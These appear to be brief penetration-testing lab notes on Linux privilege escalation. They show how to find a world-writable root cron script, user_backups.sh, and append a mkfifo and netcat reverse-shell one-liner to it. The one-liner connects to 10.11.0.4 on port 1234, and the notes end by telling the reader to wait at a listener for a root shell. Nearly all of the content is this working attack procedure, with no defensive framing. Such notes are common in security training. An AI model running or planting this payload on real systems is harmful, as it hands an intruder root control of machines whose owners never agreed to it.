Must locate an executable that allows write access and runs at elevelated priv.

Cron is one example. System-level scheduled jobs are executed with root user privs and sys admins often create scripts for cron jobs with insecure perms. 

Grep Cron log file for **running** cron jobs:
`grep "CRON" /var/log/cron.log`

Once you find a script, inspect it's contents and perms:
Ex. **user_backups.sh**
`cat /var/scripts/user_backups.sh`
#!/bin/bash
cp -rf /home/student/ /var/backups/student/
`ls -lah /var/scripts/user_backups.sh`
-rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh

Every local user can write the file. 

edit the file with a reverse shell one liner:

`echo >> user_backups.sh`
`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh`

Setup a listener and wait for the cron job to finish.
